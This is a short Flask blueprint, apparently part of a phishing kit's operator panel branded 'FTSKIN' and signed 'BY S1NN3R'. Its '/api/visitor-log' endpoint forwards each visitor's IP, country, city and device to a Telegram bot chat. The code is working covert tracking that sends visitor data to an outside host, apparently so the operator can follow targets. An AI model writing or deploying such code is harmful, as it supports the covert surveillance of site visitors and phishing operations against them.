from flask import Blueprint, request, jsonify
import requests
import os

visitor_log = Blueprint('visitor_log', __name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

@visitor_log.route('/api/visitor-log', methods=['POST'])
def log_visitor():
    data = request.get_json()
    ip = data.get('ip')
    country = data.get('country')
    city = data.get('city')
    device = data.get('device')

    message = f"""
👀 Arab IP on FTSKIN 👀
IP: {ip}
Country: {country}
City: {city}
Device: {device}
💰 BY S1NN3R 💰
"""

    try:
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=10
        )
        response.raise_for_status()
        return jsonify({"success": True}), 200
    except Exception as e:
        print("Telegram error:", e)
        return jsonify({"error": "Failed to send message"}), 500
